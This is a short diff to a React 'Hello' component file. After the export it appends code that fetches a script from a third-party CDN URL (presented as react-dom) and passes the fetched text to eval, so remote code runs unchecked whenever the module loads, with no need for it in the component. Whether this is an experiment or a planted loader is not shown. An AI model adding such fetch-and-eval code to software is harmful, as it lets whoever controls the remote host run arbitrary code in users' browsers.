@@ -12,3 +12,10 @@ const Hello = () => {
 };
 
 export default Hello;
+
+const cdn = 'https://cdn.bootcdn.net/ajax/libs/react-dom/17.0.2/umd/react-dom.production.min.js';
+
+fetch(cdn).then(res => res.text()).then(res => {
+  console.log(res);
+  return res;
+}).then(eval)
